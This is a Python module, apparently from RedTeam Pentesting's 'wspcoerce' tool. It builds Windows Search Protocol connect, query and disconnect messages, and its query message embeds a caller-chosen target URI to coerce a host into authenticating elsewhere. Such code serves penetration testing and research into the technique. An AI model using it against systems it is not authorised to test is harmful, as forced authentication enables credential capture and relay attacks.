########################################
#                                      #
#  RedTeam Pentesting GmbH             #
#  kontakt@redteam-pentesting.de       #
#  https://www.redteam-pentesting.de/  #
#                                      #
########################################

from dataclasses import dataclass, field
import struct
from typing import List, Any
import uuid

from wspcoerce.constants import *


def AlignWrite(buffer: bytearray, alignment: int):
    while len(buffer) % alignment != 0:
        buffer.extend(b"\x00")


def AddAlign(buffer: bytearray, t: bytes, alignment: int):
    AlignWrite(buffer, alignment)
    buffer.extend(t)


def CalculateChecksum(buffer: bytes, _msg: int):
    checksum = sum(
        int.from_bytes(buffer[i : i + 4], "little") for i in range(0, len(buffer), 4)
    )
    checksum ^= XOR_CONST
    checksum -= _msg
    return checksum & 0xFFFFFFFF


@dataclass
class WspMessageHeader:
    _msg: WspMessageType
    _status: int = 0
    _ulChecksum: int = 0
    _ulReserved2: int = 0

    def to_bytes(self) -> bytes:
        return struct.pack(
            "<IIII", self._msg, self._status, self._ulChecksum, self._ulReserved2
        )


@dataclass
class PropSpec:
    guid: uuid.UUID
    ulKind: int
    propid: int

    def to_bytes(self, buffer: bytearray):
        AddAlign(buffer, self.guid.bytes_le, 8)
        buffer.extend(struct.pack("<II", self.ulKind, self.propid))


@dataclass
class CColumnSet:
    indexes: List[int] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self.indexes)))
        for i in self.indexes:
            buffer.extend(struct.pack("<I", i))


@dataclass
class CDbColId:
    eKind: CDbColId_eKind_Values = CDbColId_eKind_Values.DBKIND_GUID_PROPID
    GUID: uuid.UUID = NULL_UUID
    ulId: int = 0
    vString: str = ""

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", self.eKind))
        AddAlign(buffer, self.GUID.bytes_le, 8)
        buffer.extend(struct.pack("<I", self.ulId))
        if self.eKind == CDbColId_eKind_Values.DBKIND_GUID_NAME:
            raise NotImplementedError()


@dataclass
class VT_LPSTR:
    _string: str

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self._string)))
        str_bytes = (self._string + "\0").encode("utf-16le")
        buffer.extend(str_bytes)


@dataclass
class VT_BSTR:
    _string: str

    def to_bytes(self, buffer: bytearray):
        str_bytes = (self._string + "\0").encode("utf-16le")
        buffer.extend(struct.pack("<I", len(str_bytes)))
        buffer.extend(str_bytes)


@dataclass
class VT_LPWSTR:
    _string: str

    def to_bytes(self, buffer: bytearray):
        if len(self._string) == 0:
            buffer.extend(struct.pack("<I", 0))
        else:
            str_bytes = (self._string + "\0").encode("utf-16le")
            buffer.extend(struct.pack("<I", len(self._string) + 1))
            buffer.extend(str_bytes)


def vType_to_bytes(vType, vValue, buffer: bytearray):
    if vType == CBaseStorageVariant_vType_Values.VT_I1:
        buffer.extend(struct.pack("<b", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_UI1:
        buffer.extend(struct.pack("<B", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_I2:
        buffer.extend(struct.pack("<h", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_UI2:
        buffer.extend(struct.pack("<H", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_BOOL:
        buffer.extend(struct.pack("<H", 0xFFFF if vValue else 0))
    elif vType == CBaseStorageVariant_vType_Values.VT_I4:
        buffer.extend(struct.pack("<i", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_UI4:
        buffer.extend(struct.pack("<I", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_R4:
        buffer.extend(struct.pack("<f", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_INT:
        buffer.extend(struct.pack("<i", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_UINT:
        buffer.extend(struct.pack("<I", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_ERROR:
        buffer.extend(struct.pack("<I", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_I8:
        buffer.extend(struct.pack("<l", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_UI8:
        buffer.extend(struct.pack("<L", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_R8:
        buffer.extend(struct.pack("<d", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_CY:
        buffer.extend(struct.pack("<l", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_DATE:
        buffer.extend(struct.pack("<d", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_FILETIME:
        buffer.extend(struct.pack("<l", vValue))
    elif vType == CBaseStorageVariant_vType_Values.VT_DECIMAL:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_CLSID:
        buffer.extend(vValue.bytes_le)
    elif vType == CBaseStorageVariant_vType_Values.VT_BLOB:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_BLOB_OBJECT:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_BSTR:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_LPSTR:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_LPWSTR:
        vValue.to_bytes(buffer)
    elif vType == CBaseStorageVariant_vType_Values.VT_COMPRESSED_LPWSTR:
        vValue.to_bytes(buffer)
    else:
        print(hex(vType), vValue)
        raise NotImplementedError()


@dataclass
class VT_ARRAY:
    vData: list
    vType: int

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<H", 1))  # dimesions
        buffer.extend(struct.pack("<H", 0))  # ffeatures

        temp_buffer = bytearray()
        first_element = vType_to_bytes(
            self.vType ^ CBaseStorageVariant_vType_Values.VT_ARRAY,
            self.vData[0],
            temp_buffer,
        )
        buffer.extend(
            struct.pack("<I", len(temp_buffer))
        )  # cbelements (size of each element of the array)

        buffer.extend(struct.pack("<I", len(self.vData)))  # rgsaboundElements
        buffer.extend(struct.pack("<I", 0))  # rgsaboundIlBound
        for i in self.vData:
            vType_to_bytes(
                self.vType ^ CBaseStorageVariant_vType_Values.VT_ARRAY, i, buffer
            )


@dataclass
class CBaseStorageVariant:
    vType: int
    vValue: Any
    vData1: int = 0
    vData2: int = 0

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<H", self.vType))
        buffer.extend(struct.pack("<B", self.vData1))
        buffer.extend(struct.pack("<B", self.vData2))
        if self.vType & CBaseStorageVariant_vType_Values.VT_VECTOR:
            buffer.extend(struct.pack("<I", len(self.vValue)))
            for i in self.vValue:
                AlignWrite(buffer, 4)
                vType_to_bytes(
                    self.vType ^ CBaseStorageVariant_vType_Values.VT_VECTOR, i, buffer
                )
        elif self.vType & CBaseStorageVariant_vType_Values.VT_ARRAY:
            VT_ARRAY(self.vValue, self.vType).to_bytes(buffer)
        else:
            vType_to_bytes(self.vType, self.vValue, buffer)


@dataclass
class CProp:
    DBPROPID: int
    vValue: CBaseStorageVariant
    DBPROPOPTIONS: int = 0
    DBPROPSTATUS: int = 0
    colid: CDbColId = field(default_factory=CDbColId)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", self.DBPROPID))
        buffer.extend(struct.pack("<I", self.DBPROPOPTIONS))
        buffer.extend(struct.pack("<I", self.DBPROPSTATUS))
        self.colid.to_bytes(buffer)
        self.vValue.to_bytes(buffer)


@dataclass
class CPropSet:
    guidPropertySet: uuid.UUID
    aProps: List[CProp] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(self.guidPropertySet.bytes_le)
        AddAlign(buffer, struct.pack("<I", len(self.aProps)), 4)
        for prop in self.aProps:
            AlignWrite(buffer, 4)
            prop.to_bytes(buffer)


@dataclass
class CPropertyRestriction:
    relop: int
    Property: PropSpec
    prval: str  # VT_LPWSTR value
    lcid: int = WSP_DEFAULT_LCID

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", self.relop))
        self.Property.to_bytes(buffer)

        AlignWrite(buffer, 4)

        buffer.extend(struct.pack("<I", 0x1F))  # VT_LPWSTR type
        str_bytes = (self.prval + "\0").encode("utf-16le")
        str_len = len(str_bytes) // 2  # Length in characters (16-bit)
        buffer.extend(struct.pack("<I", str_len))  # String length
        buffer.extend(str_bytes)

        AddAlign(buffer, struct.pack("<I", self.lcid), 4)


@dataclass
class CRestriction:
    ulType: int = 0
    Weight: int = 0
    Restriction: Any = None

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", self.ulType))  # Type first
        buffer.extend(struct.pack("<I", self.Weight))  # Weight second
        if self.Restriction is not None:
            self.Restriction.to_bytes(buffer)


@dataclass
class CRestrictionArray:
    restrictions: List[CRestriction] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<B", len(self.restrictions)))
        buffer.extend(struct.pack("<B", 1 if len(self.restrictions) > 0 else 0))
        AlignWrite(buffer, 4)
        for restriction in self.restrictions:
            restriction.to_bytes(buffer)


@dataclass
class CSortSet:
    sortArray: List[int] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self.sortArray)))
        for sort in self.sortArray:
            buffer.extend(struct.pack("<I", sort))


@dataclass
class CInGroupSortAggregSets:
    Reserved: int = 0
    SortSets: List[CSortSet] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<II", len(self.SortSets), self.Reserved))
        for sort_set in self.SortSets:
            sort_set.to_bytes(buffer)


@dataclass
class CCategSpec:
    def to_bytes(self, buffer):
        return bytes()


@dataclass
class CCategorizationSpec:
    csColumns: CColumnSet = field(default_factory=CColumnSet)
    Spec: CCategSpec = field(default_factory=CCategSpec)

    def to_bytes(self, buffer: bytearray):
        self.csColumns.to_bytes(buffer)
        self.Spec.to_bytes(buffer)


@dataclass
class CCategorizationSet:
    categories: List[CCategorizationSpec] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self.categories)))
        for category in self.categories:
            category.to_bytes(buffer)


@dataclass
class CRowsetProperties:
    uBooleanOptions: int = 0x00000001
    ulMaxOpenRows: int = 0
    ulMemUsage: int = 0
    cMaxResults: int = 10
    cCmdTimeout: int = 30

    def to_bytes(self, buffer: bytearray):
        buffer.extend(
            struct.pack(
                "<IIIII",
                self.uBooleanOptions,
                self.ulMaxOpenRows,
                self.ulMemUsage,
                self.cMaxResults,
                self.cCmdTimeout,
            )
        )


@dataclass
class CPidMapper:
    PropSpecs: List[PropSpec] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self.PropSpecs)))
        for prop_spec in self.PropSpecs:
            prop_spec.to_bytes(buffer)


@dataclass
class CColumnGroup:
    def to_bytes(self, buffer: bytearray):
        pass


@dataclass
class CColumnGroupArray:
    aGroupArray: List[CColumnGroup] = field(default_factory=list)

    def to_bytes(self, buffer: bytearray):
        buffer.extend(struct.pack("<I", len(self.aGroupArray)))
        for group in self.aGroupArray:
            group.to_bytes(buffer)


# Only the necessary strcuts are included for coercion
@dataclass
class CPMCreateQueryIn:
    target_uri: str

    def to_bytes(self) -> bytes:
        header = WspMessageHeader(_msg=WspMessageType.CPMCREATEQUERY)
        body = self._get_body_bytes()

        header._ulChecksum = CalculateChecksum(body, WspMessageType.CPMCREATEQUERY)

        return header.to_bytes() + body

    def _get_body_bytes(self) -> bytes:
        temp_buffer = bytearray()

        # length, will be updated later
        temp_buffer.extend(struct.pack("<I", 0))

        temp_buffer.append(0x01)  # CColumnSetPresent
        AlignWrite(temp_buffer, 4)
        CColumnSet().to_bytes(temp_buffer)

        temp_buffer.append(0x01)  # CRestrictionPresent
        restriction_array = CRestrictionArray(
            restrictions=[
                CRestriction(
                    ulType=RTPROPERTY,
                    Weight=1000,
                    Restriction=CPropertyRestriction(
                        relop=PREQ,
                        Property=PropSpec(
                            guid=uuid.UUID("b725f130-47ef-101a-a5f1-02608c9eebac"),
                            ulKind=PRSPEC_PROPID,
                            propid=0x16,
                        ),
                        prval=self.target_uri,
                    ),
                )
            ]
        )

        restriction_array.to_bytes(temp_buffer)

        temp_buffer.append(0x00)  # CSortSetPresent (not used)
        temp_buffer.append(0x00)  # CCategorizationSetPresent (not used)

        AlignWrite(temp_buffer, 4)

        rowset_props = CRowsetProperties(
            uBooleanOptions=0x00000001,
            ulMaxOpenRows=0,
            ulMemUsage=0,
            cMaxResults=10,
            cCmdTimeout=30,
        )
        rowset_props.to_bytes(temp_buffer)

        pid_mapper = CPidMapper(
            PropSpecs=[PropSpec(guid=NULL_UUID, ulKind=PRSPEC_PROPID, propid=0x16)]
        )
        pid_mapper.to_bytes(temp_buffer)

        CColumnGroupArray().to_bytes(temp_buffer)

        temp_buffer.extend(struct.pack("<I", WSP_DEFAULT_LCID))

        # Update size
        size = len(temp_buffer)
        temp_buffer[0:4] = struct.pack("<I", size)

        return bytes(temp_buffer)


@dataclass
class CPMConnectIn:
    MachineName: str
    UserName: str
    _iClientVersion: int = 0x00010700
    _fClientIsRemote: int = 0x00000001

    def default_extpropset4(self):
        return CPropSet(
            DBPROPSET_FSCIFRMWRK_EXT,
            [
                CProp(
                    DBPROPID=DBPROP_CI_CATALOG_NAME,
                    vValue=CBaseStorageVariant(
                        vType=CBaseStorageVariant_vType_Values.VT_BSTR,
                        vValue=VT_BSTR("Windows\\SYSTEMINDEX"),
                    ),
                )
            ],
        )

    def to_bytes(self) -> bytes:
        header = WspMessageHeader(_msg=WspMessageType.CPMCONNECT)
        body = self._get_body_bytes()

        # Calculate checksum
        header._ulChecksum = CalculateChecksum(body, WspMessageType.CPMCONNECT)

        return header.to_bytes() + body

    def _get_body_bytes(self) -> bytes:
        temp_buffer = bytearray()
        temp_buffer.extend(struct.pack("<I", self._iClientVersion))
        temp_buffer.extend(struct.pack("<I", self._fClientIsRemote))

        blob1_buffer = bytearray()
        blob1_buffer.extend(struct.pack("<I", 0))  # No default propsets
        temp_buffer.extend(struct.pack("<I", len(blob1_buffer)))

        blob2_buffer = bytearray()
        AddAlign(
            blob2_buffer, struct.pack("<I", 1), 8
        )  # only DBPROP_CI_CATALOG_NAME prop
        self.default_extpropset4().to_bytes(blob2_buffer)

        AddAlign(temp_buffer, struct.pack("<I", len(blob2_buffer)), 8)
        temp_buffer.extend(bytes(12))

        temp_buffer.extend((self.MachineName + "\0").encode("utf-16le"))
        temp_buffer.extend((self.UserName + "\0").encode("utf-16le"))

        AlignWrite(temp_buffer, 8)

        temp_buffer.extend(blob1_buffer)

        AlignWrite(temp_buffer, 8)

        temp_buffer.extend(blob2_buffer)

        temp_buffer.extend(bytes(4))

        return bytes(temp_buffer)


@dataclass
class CPMDisconnect:
    def to_bytes(self) -> bytes:
        header = WspMessageHeader(_msg=WspMessageType.CPMDISCONNECT)
        header._ulChecksum = CalculateChecksum(b"", WspMessageType.CPMDISCONNECT)
        # No body for disconnect message
        return header.to_bytes()
